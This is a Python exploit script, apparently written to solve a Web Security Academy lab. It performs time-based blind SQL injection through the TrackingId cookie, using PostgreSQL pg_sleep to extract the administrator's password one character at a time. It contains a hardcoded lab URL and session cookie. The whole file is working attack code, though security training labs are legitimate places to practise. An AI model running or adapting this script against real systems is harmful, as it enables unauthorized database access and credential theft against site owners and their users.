import requests
import time
from pwn import *
import string
burp0_url = "https://0a810065030631c88214a68400040029.web-security-academy.net:443/product?productId=2"

burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://0a810065030631c88214a68400040029.web-security-academy.net/", "Dnt": "1", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Priority": "u=0, i", "Te": "trailers", "Connection": "keep-alive"}



def sqli():
    password = ""
    progres1 = log.progress('FUERZA BRUTA CON TIEMPO')
    progres1.status("iniciando ataque")
    progres2 = log.progress('CONTRASEÑA: ')
    for pos in range(24):
        for char in string.ascii_letters + string.digits:
            burp0_cookies = {"TrackingId":f"'%3B SELECT CASE WHEN (SUBSTRING(password,{pos},1)='{char}') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'-- ", "session": "3P0fzqiYroy9yQPTt8GxyIRQoeivqfpE"}
            progres1.status(burp0_cookies["TrackingId"])
            t1 = time.time()
            requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
            t2= time.time()
            if t2-t1>=10:
                password+=char
                progres2.status(password)
                break


if __name__ =='__main__':
    sqli()
            
    